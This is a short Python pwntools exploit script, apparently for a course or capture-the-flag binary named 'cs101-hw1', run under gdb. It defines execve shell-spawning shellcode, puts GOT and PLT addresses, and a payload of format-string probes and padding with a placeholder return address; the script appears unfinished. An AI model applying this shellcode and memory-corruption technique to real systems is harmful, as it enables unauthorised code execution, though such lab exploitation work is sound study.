from pwn import *

p = gdb.debug("./cs101-hw1", '''
b *main
b *input+24
b *input+51''')

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'


# 0x00000000004010d7: mov edi, 0x404050; jmp rax;
# [0x404018] puts@GLIBC_2.2.5  →  0x7f2475395820
# 0x404050 - 0x404018

mov_edi = 0x404050 - 56

main = p64(0x40120c)
puts_plt = p64(0x401255)
puts_got = p64(0x404018)

pad_A = b'%p' * 32
pad_B = b'B' * 8
rip = b'C' * 8
pad_D = b'D' * 8


payload = pad_A + pad_B + rip + pad_D

p.sendline(payload)
p.interactive()

